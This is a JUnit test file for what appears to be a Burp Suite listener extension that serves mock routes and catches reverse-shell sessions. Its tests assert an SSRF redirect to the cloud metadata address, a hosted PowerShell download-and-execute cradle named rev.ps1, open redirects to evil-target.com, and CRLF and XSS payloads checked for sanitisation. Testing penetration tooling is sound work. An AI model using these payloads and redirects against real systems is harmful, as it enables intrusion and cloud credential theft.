package burp;

import burp.listener.MockRoute;
import burp.listener.SessionManager;
import burp.listener.ShellSession;
import burp.listener.TlsSocketHelper;
import burp.listener.WebhookResponseConfig;
import org.junit.Test;

import javax.net.ssl.SSLContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;

import static org.junit.Assert.*;

public class FeatureExpansionTest {

    @Test
    public void testMockRoutesAndRedirects() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // 1. Test /redirect route (SSRF Redirector)
        byte[] redirectResp = config.buildResponseBytes("10.10.10.2", "GET", "/redirect", 8080, "Host: 10.10.10.2", 0);
        String redirectStr = new String(redirectResp, StandardCharsets.UTF_8);
        assertTrue(redirectStr.contains("HTTP/1.1 302 Found"));
        assertTrue(redirectStr.contains("Location: http://169.254.169.254/latest/meta-data/"));

        // 2. Test /aws-meta route
        byte[] awsResp = config.buildResponseBytes("10.10.10.2", "GET", "/aws-meta", 8080, "Host: 10.10.10.2", 0);
        String awsStr = new String(awsResp, StandardCharsets.UTF_8);
        assertTrue(awsStr.contains("HTTP/1.1 200 OK"));
        assertTrue(awsStr.contains("instanceId"));

        // 3. Test Auto-Host Payload
        config.autoHostPayload("powershell -c \"iex(new-object net.webclient).downloadstring('...')\"", "rev.ps1");
        byte[] payloadResp = config.buildResponseBytes("10.10.10.2", "GET", "/rev.ps1", 8080, "Host: 10.10.10.2", 0);
        String payloadStr = new String(payloadResp, StandardCharsets.UTF_8);
        assertTrue(payloadStr.contains("powershell -c"));
    }

    @Test
    public void testQueryParameterOverrides() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Test dynamic ?status=302&location=https://evil-target.com
        byte[] dynRedirect = config.buildResponseBytes("10.10.10.5", "GET", "/?status=302&location=https://evil-target.com", 8080, "Host: test", 0);
        String dynRedirectStr = new String(dynRedirect, StandardCharsets.UTF_8);
        assertTrue(dynRedirectStr.contains("HTTP/1.1 302"));
        assertTrue(dynRedirectStr.contains("Location: https://evil-target.com"));

        // Test dynamic ?status=401&body=UnauthorizedAccess
        byte[] dynAuth = config.buildResponseBytes("10.10.10.5", "GET", "/?status=401&body=UnauthorizedAccess", 8080, "Host: test", 0);
        String dynAuthStr = new String(dynAuth, StandardCharsets.UTF_8);
        assertTrue(dynAuthStr.contains("HTTP/1.1 401"));
        assertTrue(dynAuthStr.contains("UnauthorizedAccess"));
    }

    @Test
    public void testCrlfInjectionPreventionInLocationHeader() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Attempt CRLF header injection via location parameter: ?status=302&location=https://evil.com%0d%0aInjected-Header:%20pwned
        byte[] resp = config.buildResponseBytes("10.10.10.5", "GET", "/?status=302&location=https://evil.com\r\nInjected-Header: pwned", 8080, "Host: test", 0);
        String respStr = new String(resp, StandardCharsets.UTF_8);

        // Verify no CRLF in the Location header line and no injected header
        assertFalse(respStr.contains("\r\nInjected-Header: pwned\r\n"));
        assertTrue(respStr.contains("Location: https://evil.comInjected-Header: pwned\r\n"));
    }

    @Test
    public void testXssHtmlEncodingInWebhookResponse() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Attempt XSS via client IP, path, method, and headers
        String xssPath = "/test?param=<script>alert('XSS')</script>";
        String xssIp = "<img src=x onerror=alert(1)>";
        String xssMethod = "<svg onload=alert(1)>";
        String xssHeaders = "Header: <script>alert(document.cookie)</script>";

        byte[] resp = config.buildResponseBytes(xssIp, xssMethod, xssPath, 8080, xssHeaders, 100);
        String respStr = new String(resp, StandardCharsets.UTF_8);

        // Verify all XSS payloads are HTML-encoded and raw executable tags do NOT exist in the body
        assertFalse(respStr.contains("<script>alert('XSS')</script>"));
        assertFalse(respStr.contains("<img src=x onerror=alert(1)>"));
        assertFalse(respStr.contains("<svg onload=alert(1)>"));
        assertFalse(respStr.contains("<script>alert(document.cookie)</script>"));

        assertTrue(respStr.contains("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;"));
        assertTrue(respStr.contains("&lt;img src=x onerror=alert(1)&gt;"));
        assertTrue(respStr.contains("&lt;svg onload=alert(1)&gt;"));
        assertTrue(respStr.contains("&lt;script&gt;alert(document.cookie)&lt;/script&gt;"));
    }

    @Test
    public void testTlsCertificateGenerationAndUniqueKeys() throws Exception {
        // Generate two self-signed certificates and verify they have unique key pairs and serials
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048, new SecureRandom());

        KeyPair kp1 = kpg.generateKeyPair();
        KeyPair kp2 = kpg.generateKeyPair();

        X509Certificate cert1 = TlsSocketHelper.generateSelfSignedCertificate(kp1, "Reverse Shell Receiver");
        X509Certificate cert2 = TlsSocketHelper.generateSelfSignedCertificate(kp2, "Reverse Shell Receiver");

        assertNotNull(cert1);
        assertNotNull(cert2);
        assertNotEquals(cert1.getSerialNumber(), cert2.getSerialNumber());
        assertNotEquals(cert1.getPublicKey(), cert2.getPublicKey());

        // Verify certificate validity
        cert1.checkValidity();
        cert2.checkValidity();
        assertEquals("CN=Reverse Shell Receiver", cert1.getSubjectDN().getName());
        assertEquals("SHA256withRSA", cert1.getSigAlgName());
    }

    @Test
    public void testTlsSettingsPersistenceWithCallbacks() throws Exception {
        Map<String, String> settingsStore = new HashMap<>();
        IBurpExtenderCallbacks callbacks = createMockCallbacks(settingsStore, null);

        // First call should generate and save certificate
        SSLContext sslContext1 = TlsSocketHelper.createSslContext(callbacks);
        assertNotNull(sslContext1);
        assertTrue(settingsStore.containsKey("tls_keystore_b64"));
        assertTrue(settingsStore.containsKey("tls_keystore_password"));

        String savedB64 = settingsStore.get("tls_keystore_b64");
        String savedPwd = settingsStore.get("tls_keystore_password");
        assertNotNull(savedB64);
        assertNotNull(savedPwd);

        // Second call should reload the existing certificate from settingsStore
        SSLContext sslContext2 = TlsSocketHelper.createSslContext(callbacks);
        assertNotNull(sslContext2);
        assertEquals(savedB64, settingsStore.get("tls_keystore_b64"));
        assertEquals(savedPwd, settingsStore.get("tls_keystore_password"));
    }

    @Test
    public void testTlsSocketHelper() throws Exception {
        SSLContext sslContext = TlsSocketHelper.createSslContext();
        assertNotNull(sslContext);
        assertEquals("TLS", sslContext.getProtocol());

        // Test creating an actual SSLServerSocket and accepting a test client
        javax.net.ssl.SSLServerSocket serverSocket = TlsSocketHelper.createTlsServerSocket(0, 5, java.net.InetAddress.getByName("127.0.0.1"));
        assertNotNull(serverSocket);
        int localPort = serverSocket.getLocalPort();

        Thread serverThread = new Thread(() -> {
            try (javax.net.ssl.SSLSocket client = (javax.net.ssl.SSLSocket) serverSocket.accept()) {
                client.getOutputStream().write("HTTP/1.1 200 OK\r\n\r\nTLS OK".getBytes(StandardCharsets.UTF_8));
                client.getOutputStream().flush();
            } catch (Exception ignored) {}
        });
        serverThread.start();

        javax.net.ssl.SSLSocket clientSocket = (javax.net.ssl.SSLSocket) sslContext.getSocketFactory().createSocket("127.0.0.1", localPort);
        clientSocket.startHandshake();

        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(clientSocket.getInputStream()));
        String line = reader.readLine();
        assertEquals("HTTP/1.1 200 OK", line);

        clientSocket.close();
        serverSocket.close();
    }

    @Test
    public void testSessionManagerMemoryLeakFix() throws Exception {
        SessionManager manager = new SessionManager(Executors.newCachedThreadPool());
        assertEquals(0, manager.getAllSessions().size());
        assertEquals(0, manager.getActiveSessionCount());

        // Register dummy sockets as sessions
        MockSocket dummySocket1 = new MockSocket();
        MockSocket dummySocket2 = new MockSocket();

        ShellSession s1 = manager.registerNewSession(dummySocket1);
        ShellSession s2 = manager.registerNewSession(dummySocket2);

        assertEquals(2, manager.getAllSessions().size());

        // Close session 1 -> must remove s1 from the sessions list completely
        manager.closeSession(s1.getId());
        assertEquals(1, manager.getAllSessions().size());
        assertFalse(manager.getAllSessions().contains(s1));
        assertTrue(manager.getAllSessions().contains(s2));

        // Close session 2 -> list must become empty
        manager.closeSession(s2.getId());
        assertEquals(0, manager.getAllSessions().size());
    }

    @Test
    public void testShellSessionUnexpectedErrorLogged() throws Exception {
        StringBuilder errorLog = new StringBuilder();
        IBurpExtenderCallbacks callbacks = createMockCallbacks(new HashMap<>(), errorLog);

        // Socket that throws IOException on read while session is still active
        MockErrorSocket errorSocket = new MockErrorSocket();
        ShellSession session = new ShellSession(1, errorSocket, callbacks, null);
        session.startReading(Executors.newSingleThreadExecutor());

        // Wait for reader thread to encounter IOException
        Thread.sleep(200);

        assertTrue("Expected error to be logged when connection breaks unexpectedly", errorLog.toString().contains("broken unexpectedly"));
        assertFalse("Session should be marked inactive", session.isActive());
    }

    // --- Mock Helpers ---

    private static IBurpExtenderCallbacks createMockCallbacks(Map<String, String> settingsStore, StringBuilder errorLog) {
        return (IBurpExtenderCallbacks) Proxy.newProxyInstance(
                IBurpExtenderCallbacks.class.getClassLoader(),
                new Class<?>[] { IBurpExtenderCallbacks.class },
                (proxy, method, args) -> {
                    String name = method.getName();
                    if ("loadExtensionSetting".equals(name)) {
                        return settingsStore.get((String) args[0]);
                    } else if ("saveExtensionSetting".equals(name)) {
                        settingsStore.put((String) args[0], (String) args[1]);
                        return null;
                    } else if ("printError".equals(name)) {
                        if (errorLog != null && args != null && args.length > 0) {
                            errorLog.append(args[0]).append("\n");
                        }
                        return null;
                    } else if ("printOutput".equals(name)) {
                        return null;
                    }
                    Class<?> returnType = method.getReturnType();
                    if (returnType == boolean.class) return false;
                    if (returnType == int.class) return 0;
                    return null;
                }
        );
    }

    private static class MockSocket extends Socket {
        private final ByteArrayInputStream in = new ByteArrayInputStream(new byte[0]);
        private final ByteArrayOutputStream out = new ByteArrayOutputStream();
        private boolean closed = false;

        @Override public InputStream getInputStream() { return in; }
        @Override public OutputStream getOutputStream() { return out; }
        @Override public InetAddress getInetAddress() {
            try { return InetAddress.getByName("127.0.0.1"); } catch (Exception e) { return null; }
        }
        @Override public int getPort() { return 54321; }
        @Override public synchronized void close() { closed = true; }
        @Override public boolean isClosed() { return closed; }
    }

    private static class MockErrorSocket extends Socket {
        private boolean closed = false;

        @Override
        public InputStream getInputStream() {
            return new InputStream() {
                @Override
                public int read() throws IOException {
                    throw new IOException("Connection reset by peer (simulated unexpected failure)");
                }
            };
        }

        @Override public OutputStream getOutputStream() { return new ByteArrayOutputStream(); }
        @Override public InetAddress getInetAddress() {
            try { return InetAddress.getByName("127.0.0.1"); } catch (Exception e) { return null; }
        }
        @Override public int getPort() { return 54321; }
        @Override public synchronized void close() { closed = true; }
        @Override public boolean isClosed() { return closed; }
    }
}
